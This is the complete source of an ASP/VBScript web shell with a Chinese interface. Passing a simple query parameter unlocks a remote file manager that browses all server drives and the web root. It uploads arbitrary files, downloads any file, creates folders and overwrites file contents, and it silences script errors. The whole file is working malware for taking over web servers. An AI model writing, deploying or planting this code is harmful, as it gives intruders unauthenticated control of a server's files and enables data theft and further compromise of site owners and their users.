<%@ LANGUAGE = VBScript.Encode %>
<OBJECT RUNAT=Server ID=fs classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></OBJECT>

<%gl=rq("gl"):if gl<>"" then Session("gl")=gl
Response.Clear:echo "<a href="&self&"?gl=file>file</a> "
pwd1="file":if Session("gl")="file" then

if left(aduser,4)="fso:" then
	fso=mid(aduser,5)
else
	fso="scripting.filesystemobject"
end if
echo fso
AdodbS="Adodb.Stream"
on error resume next
bbf=chr(13)&chr(10):y=chr(34):self=Request("URL")
function echo(lpstr):response.write lpstr:end function
function rq(lpstr):rq=request(lpstr):end function
function close():echo "<script>opener.document.location.reload();opener=null;self.close();</script>":response.end:end function
echo "<script>"&bbf
echo "window.onerror=x_err;function x_err(sMsg,sUrl,sLine){return true}"&bbf
echo ""&"var url="""&replace(self,"\","\\")&""";"&""&bbf
echo "function sattw(srcf){w=ow(350);w.location=url+""?fdo=gattr&fp1=""+srcf;}"&bbf
echo "function ren(f1,f2){location=url+""?fdo=ren&fp1=""+fp1+f1+""&fp2=""+fp1+document.all[f2].value;}"&bbf
echo "function downall(){ow(600).document.write(down);}"&bbf
echo "function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<1000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"&bbf
echo "function ow(w){return window.open("""","""",""scrollbars=no,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,height=300,width=""+w);}"&bbf
echo "</script>"&bbf
echo "<STYLE>body,td,span,div,a{FONT-SIZE:9pt;text-decoration:none}"&bbf
echo "span,a{cursor:hand;color:blue;}hr{height:1px;line-height:1px;color:#0000ff;}"&bbf
echo "</style><body Leftmargin=6 Topmargin=2>"&bbf
if not isobject(fs) then set fs= server.createobject(fso)
if fdo="" then fdo=lcase(request("fdo"))
fp1=request("fp1")
fp2=request("fp2")
if fdo="up" and Request.TotalBytes>20 then
	set dr1=server.CreateObject(AdodbS):dr1.Mode=3:dr1.Type=1:dr1.Open
	set dr2=server.CreateObject(AdodbS):dr2.Mode=3:dr2.Type=1:dr2.Open
	lnBytes=Request.BinaryRead(Request.TotalBytes)
	SignLen=Instrb(1,lnBytes,CStrB(bbf))-1
	Sign=MidB(lnBytes,1,SignLen)
	fname=tractName(getfilename()) '取文件名
	fp1=getvalue("fp1") '取路径值
	if fname<>"" and fp1<>"" then
		savefile(fp1&fname)
	else
		echo "文件名或路径错!"
	end if
	dr1.Close
	dr2.Close
	set dr1=nothing
	set dr2=nothing
	response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="down" then
	downFile(fp1)
	response.end
end if

if fdo="adddir" then
	fp1=pn(fp1):fs.createfolder(fp1)
	response.redirect self&"?fp1="&fp1&"\"
end if
if fdo="newfile" then
	fp1=pn(fp1):if not fs.fileExists(fp1) then fs.createtextfile(fp1)
	response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="sedit" then
	fs.getfile(fp1).attributes=32
	fs.CreateTextFile(fp1).Write replace(Request("fp2"),"<_/"&"textarea>","</tex"&"tarea>")
	echo "<script>opener=null;self.close();</script>":response.end
end if
if fdo="gedit" then
	att=fs.getfile(fp1).attributes
	echo "<form METHOD=POST action="""&self&"""><input size=80 type=text name=fp1 value="""&fp1&"""><br>"
	echo "<input name=fdo value=sedit type=hidden><textarea cols=90 rows=20 name=fp2>"
	wj=fs.OpenTextFile(fp1,1,0,0).read(5000000)
	echo replace(replace(wj,"</tex"&"tarea>","<_/"&"textarea>"),"</TEX"&"TAREA>","<_/"&"textarea>")
	echo "</textarea><center><input type=submit value=-------保存-------> <a onclick=opener=null;self.close();>放弃</a></form>"
	response.end
end if

'开始
if request("fp1")<>"" then session("fp1")=request("fp1")
if fp1="" then fp1=session("fp1")
echo "<table border=0 cellspacing=0 cellpadding=0><tr><td>"
echo "<form name=fu method=post action="""&self&"?fdo=up"" enctype=multipart/form-data>"
for each d in fs.drives '盘符
	drv=d.DriveLetter
	echo "<a href="""&self&"?fp1="&drv&":\"">"&drv&Tran(d.DriveType)&"</a>  "
next

n=parentdir(fp1)
echo "<input type=hidden name=fp1 value="""&fp1&""">"
echo "<input type=file size=9 name=file1><input type=submit value=上传></td></form></tr>"
echo "<tr><td><form name=f><input size=30 name=fp1 value="""&fp1&""">"
fp1=replace(fp1,"\","/")

echo "[<a href="""&self&"?fp1="&server.mappath(".")&"\"">程序目录</a>]"
echo "[<a href="""&self&"?fp1="&server.mappath("\")&"\"">网站目录</a>]"
fp1=replace(fp1,"/","\")
if fp1="" then response.end
if n<>"" then echo "[<a href="""&self&"?fp1="&n&""">..</a>]"
echo "<br>"
Set fdir=fs.GetFolder(fp1) '目录
fp1=replace(fp1,chr(38),"%26")
c=0:For each n in fdir.SubFolders
	c=c+1:echo "[<a href="""&self&"?fp1="&fp1&replace(n.name,chr(38),"%26")&"\"">"&n.name&"</a>]"
Next


echo "<table width=760 border=0 cellspacing=1 cellpadding=0><script>"&bbf

echo "var fp1="""&replace(fp1,"\","\\")&""";"


echo "var c="""",itm=0,down="""";"&bbf
echo "function cpy(srcf)"&bbf
echo "{w=ow(400);w.moveTo(100,200);"&bbf


echo "w.document.write(z);}"&bbf
echo "function sf(lpstr,lpsize)"&bbf
echo "{var p1,p2,z;"&bbf
echo "if(!(parseInt((itm)/2)%2))c=""#cccccc"";else c=""#ffffff"";"&bbf
echo "itm++;p1=""<td><a href=\""""+url+""?fdo="";"&bbf
echo "p2=""&fp1=""+fp1+lpstr+""\"">"";"&bbf
echo "z="""";if(itm%2)z=""<tr bgcolor=""+c+"">"";"&bbf
echo "z+=""<td><a target=\""""+lpstr+""\"" href=\""""+url+""?fdo=gedit&fp1=""+fp1+lpstr+""\"">编辑</a></td>"";"&bbf
echo "z+=""<td width=178><input size=20 name=o""+itm+"" value=\""""+lpstr+""\"" style=background-color:""+c+"";></td>"";"&bbf
echo "z+=""<td title='""+lpsize/1000000+""M""+""' ondblclick=location='""+url+""?gl=sql&pass=islogin&host=""+replace(fp1,""\\"",""/"")+lpstr+""'>""+lpsize+""</td>"";"&bbf
echo "if(lpsize>0){z+=p1+""down""+p2+""下载</a></td>"";down+=""[<a href=\""""+url+""?fdo=down""+p2+lpstr+""</a>]"";}else z+=""<td></td>"""&bbf
echo "if(!(itm%2))z+=""</tr>"";else z+=""<td bgcolor=#aaaaaa width=30> </td>"""&bbf
echo "document.write(z);"&bbf
echo "}"&bbf
c=0:For each n in fdir.Files '文件
	c=c+1:echo "sf('"&replace(n.name,chr(38),"%26")&"','"&n.size&"');"
next
echo "</script></table>以上总共<font color=red>"&c&"</font>个文件<hr>"

function getvalue(lpitem)
	pstr="name="&chr(34)&lpitem&chr(34)
	startpos=instrb(1,lnBytes,CstrB(pstr))
	if startpos<2 then getvalue="":exit function
	startpos=instrb(startpos,lnBytes,CstrB(bbf&bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getvalue=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
function getfdata()
	dim lpdata(1)
	startpos=instrb(1,lnBytes,CstrB("filename="""))
	if startpos<2 then getfdata="":exit function
	startpos=instrb(startpos,lnBytes,CStrB(bbf&bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getfdata=(startpos-1)&","&(EndPos-startpos)
end function
function savefile(lpFileName)
	fdata=getfdata()
	fdata=split(fdata,",")
	if fdata(0)<1 or fdata(1)<1 then savefile=-1:exit function
	dr1.write lnBytes
	dr1.position=fdata(0)
	dr1.copyto dr2,fdata(1)
	dr2.SaveToFile lpFileName,2
end function
function getfilename()
	startpos=instrb(1,lnBytes,CstrB("filename="&chr(34)))+10
	if startpos<2 then getfilename="":exit function
	EndPos=instrb(startpos,lnBytes,CstrB(""""))
	getfilename=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
Function  BtoS(Binstr)
	skipflag=0
	strC=""
	If Not IsNull(binstr) Then
	lnglen=LenB(binstr)
	For ix=1 To lnglen
	If skipflag=0 Then
	tmpBin=MidB(binstr,ix,1)
	If AscB(tmpBin)>127 Then
	strC=strC&Chr(AscW(MidB(binstr,ix+1,1)&tmpBin))
	skipflag=1
	Else
	strC=strC&Chr(AscB(tmpBin))
	End If
	Else
	skipflag=0
	End If
	Next
	End If
	BtoS  =  strC
End  Function
Function CStrB(ByRef psUnicodeString)
	Dim lnLength
	Dim lnPosition
	lnLength = Len(psUnicodeString)
	For lnPosition = 1 To lnLength
		CStrB = CStrB & ChrB(AscB(Mid(psUnicodeString, lnPosition, 1)))
	Next
End Function
Function tractName(lpfilename)
	nlen=len(lpfilename)
	For lpx = nlen To 1 step -1
		if mid(lpfilename,lpx,1)="\" then
			tractName=mid(lpfilename,lpx+1,100)
			exit Function
		end if
	Next
	tractName=""
End Function
function parentdir(t)
	t=replace(t,"/","\")
	ls=split(t,"\")
	for x=0 to ubound(ls)-2
	parentdir=parentdir+ls(x)&"\"
	next
	parentdir=replace(parentdir,chr(38),"%26")
End function
function pn(t)
	pn=replace(t,"/","\")
	if right(pn,1)="\" then pn=left(pn,len(pn)-1)
	if right(pn,1)="\" then pn=left(pn,len(pn)-1)
End function
function downFile(strFile)
	Response.Buffer = True
	Response.Clear
	Set s=Server.CreateObject(AdodbS)
	s.Open
	s.Type=1
	if not fs.FileExists(strFile) then Response.Write(strFile&"文件不存在！"):Response.End
	Set f=fs.GetFile(strFile)
	intFilelength=f.size
	s.LoadFromFile(strFile)
	if err then Response.Write("读文件出错:"&err.Description):Response.End
	Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
	Response.AddHeader "Content-Length", intFilelength
	Response.CharSet = "UTF-8"
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite s.Read
	response.flush
	response.clear
	s.Close
	Set s = Nothing
End Function 
function Tran(drv)
select case drv:case 0:Tran="怪盘":case 1:Tran="软盘":case 2:Tran="硬盘"
case 3:Tran="网络":case 4:Tran="光盘":case 5:Tran="RAM":end select:end function
response.end
end if
%>


